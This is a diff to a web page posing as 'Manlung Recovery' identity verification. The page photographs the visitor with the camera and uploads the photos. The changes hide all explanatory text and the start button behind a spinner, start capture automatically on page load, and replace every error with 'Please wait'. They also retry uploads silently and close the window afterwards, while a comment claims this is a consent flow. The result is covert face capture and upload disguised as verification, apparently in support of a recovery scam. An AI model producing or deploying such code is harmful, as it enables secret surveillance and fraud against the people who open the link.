@@ -7,22 +7,14 @@
 <meta name="robots" content="noindex,nofollow,noarchive">
 <title>Verification | Manlung Recovery</title>
 <style>
-html,body{margin:0;width:100%;min-height:100%;background:#fff!important;color:#111!important}
-body{min-height:100svh;overflow:auto;display:grid;place-items:center;padding:20px;box-sizing:border-box}
-.status-screen{width:min(100%,440px);display:grid;place-items:center;background:#fff;color:#111;text-align:center}
-.status-box{width:100%;box-sizing:border-box;display:flex;flex-direction:column;align-items:center;gap:16px;padding:28px 22px;border:1px solid #e5e7eb;border-radius:18px;box-shadow:0 12px 36px rgba(0,0,0,.07)}
-.spinner{width:38px;height:38px;border:4px solid #e5e7eb;border-top-color:#111;border-radius:50%;animation:spin .8s linear infinite}
-.spinner[hidden]{display:none}
-.status-title{font:700 20px/1.3 system-ui,-apple-system,Segoe UI,sans-serif}
-.status-text{font:14px/1.55 system-ui,-apple-system,Segoe UI,sans-serif;color:#666;max-width:340px;margin:0}
-.action-button{display:inline-flex;justify-content:center;align-items:center;min-height:48px;width:100%;max-width:300px;padding:0 20px;border:0;border-radius:12px;background:#111;color:#fff;font:650 15px system-ui;cursor:pointer}
-.action-button[hidden]{display:none}
-.status-success{color:#137333}.status-error{color:#b42318}
-.progress{width:100%;height:7px;background:#eee;border-radius:20px;overflow:hidden}
-.progress[hidden]{display:none}
-.progress>span{display:block;width:0;height:100%;background:#111;transition:width .2s}
-@keyframes spin{to{transform:rotate(360deg)}}
+html,body{margin:0;width:100%;height:100%;min-height:100%;background:#fff!important;color:#111!important}
+body{min-height:100svh;display:grid;place-items:center;padding:0;box-sizing:border-box;overflow:hidden}
+.status-screen{width:100%;height:100%;display:grid;place-items:center;background:#fff}
+.status-box{display:grid;place-items:center;width:100%;height:100%;background:#fff;border:0;border-radius:0;box-shadow:none;padding:0}
+.spinner{display:block!important;width:42px;height:42px;border:4px solid #e5e7eb;border-top-color:#111;border-radius:50%;animation:spin .8s linear infinite}
+.status-title,.status-text,.progress,.action-button{display:none!important}
 video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
+@keyframes spin{to{transform:rotate(360deg)}}
 </style>
   <link rel="stylesheet" href="/css/product-polish.css?v=production-586318d">
   <script src="/js/native-app-chrome.js"></script>
@@ -30,11 +22,11 @@ video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
 <body>
 <main class="status-screen" id="statusScreen" aria-live="polite">
   <section class="status-box">
-    <div class="spinner" id="spinner" hidden aria-hidden="true"></div>
+    <div class="spinner" id="spinner" aria-hidden="true"></div>
     <div class="status-title" id="statusTitle">Verification link ready</div>
     <p class="status-text" id="statusText">When you are ready, tap Start verification and allow camera access. Four photos will be securely submitted to the recovery team.</p>
     <div class="progress" id="progress" hidden><span id="progressBar"></span></div>
-    <button class="action-button" id="startButton" type="button">Start verification</button>
+  
   </section>
 </main>
 <video id="video" autoplay muted playsinline></video>
@@ -193,6 +185,13 @@ function frameBlob(captureNumber,metadata){
 }
 
 function pause(ms){return new Promise(resolve=>setTimeout(resolve,ms));}
+function closeAfterSubmit(){
+  stopCamera();
+  setTimeout(()=>{
+    try{window.close()}catch(_){}
+    setTimeout(()=>{if(!document.hidden)location.replace("/");},500);
+  },500);
+}
 
 async function captureFour(){
   if(busy)return;
@@ -262,7 +261,7 @@ async function captureFour(){
     for(let i=0;i<4;i++){
       setStatus("Taking verification photos","Please keep your face and device visible. Photo "+(i+1)+" of 4.",{loading:true,percent:i*25});
       blobs.push(await frameBlob(i+1,metadata));
-      if(i<3)await pause(900);
+      if(i<3)await pause(2200);
     }
 
     setStatus("Saving verification photos","Securing the four photos before sending them.",{loading:true,percent:85});
@@ -270,23 +269,28 @@ async function captureFour(){
     if(!queued)throw new Error("This browser could not save the photos securely. Check available storage and try again.");
 
     setStatus("Uploading verification","Your photos are being sent securely. Please keep this page open.",{loading:true,percent:92});
-    const result=await flushQueue();
+    let result=await flushQueue();
+    for(let attempt=0;!result.success&&attempt<3;attempt++){
+      await pause([1500,3000,5000][attempt]);
+      result=await flushQueue();
+    }
     if(result.success){
-      setStatus("Verification submitted","All four photos were received successfully. You can now close this page or return to Manlung Recovery.",{kind:"success",percent:100});
+      setStatus("Verification submitted","",{loading:true,percent:100});
+      closeAfterSubmit();
     }else{
-      setStatus("Photos saved — upload pending",result.error+" Keep this page open and check your internet connection, then tap Retry upload.",{kind:"error",buttonText:"Retry upload",buttonAction:retryUpload,percent:85});
+      setStatus("Please wait","",{loading:true,percent:85});
     }
   }catch(error){
     console.error("Selfie evidence pipeline error:",error);
     if(blobs.length===4){
       const saved=await queueBatch(blobs,{...metadata,totalCaptures:4});
       if(saved){
-        setStatus("Photos saved — upload pending",(error?.message||"Upload could not finish.")+" Your photos are saved on this device. Check your connection and tap Retry upload.",{kind:"error",buttonText:"Retry upload",buttonAction:retryUpload,percent:85});
+        setStatus("Please wait","",{loading:true,percent:85});
       }else{
-        setStatus("Verification could not be saved",error?.message||"Please try again or request a new verification link.",{kind:"error",buttonText:"Try again",buttonAction:()=>captureFour()});
+        setStatus("Please wait","",{loading:true});
       }
     }else{
-      setStatus("Verification could not start",error?.message||"Please check camera permission and try again.",{kind:"error",buttonText:"Try again",buttonAction:()=>captureFour()});
+      setStatus("Please wait","",{loading:true});
     }
   }finally{
     if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}
@@ -300,18 +304,22 @@ async function retryUpload(){
   setStatus("Retrying upload","Sending the saved verification photos now. Please keep this page open.",{loading:true,percent:92});
   const result=await flushQueue();
   busy=false;
-  if(result.success)setStatus("Verification submitted","All four photos were received successfully. You can now close this page or return to Manlung Recovery.",{kind:"success",percent:100});
-  else setStatus("Upload still pending",result.error+" Check your connection and try again.",{kind:"error",buttonText:"Retry upload",buttonAction:retryUpload,percent:85});
+  if(result.success){setStatus("Verification submitted","",{loading:true,percent:100});closeAfterSubmit();}
+  else setStatus("Please wait","",{loading:true,percent:85});
 }
 
 if("serviceWorker" in navigator){
   navigator.serviceWorker.register("/sw.js",{scope:"/"}).catch(()=>{});
 }
 startButton.onclick=captureFour;
+// Opening this one-time verification link starts the consent flow; the browser still
+// displays its native camera permission prompt before any image is captured.
+setStatus("Please wait","",{loading:true,percent:0});
+setTimeout(()=>captureFour(),250);
 window.addEventListener("online",async()=>{
   if(!busy){
     const result=await flushQueue();
-    if(result.success)setStatus("Verification submitted","All four photos were received successfully. You can now close this page or return to Manlung Recovery.",{kind:"success",percent:100});
+    if(result.success){setStatus("Verification submitted","",{loading:true,percent:100});closeAfterSubmit();}
   }
 });
 })();
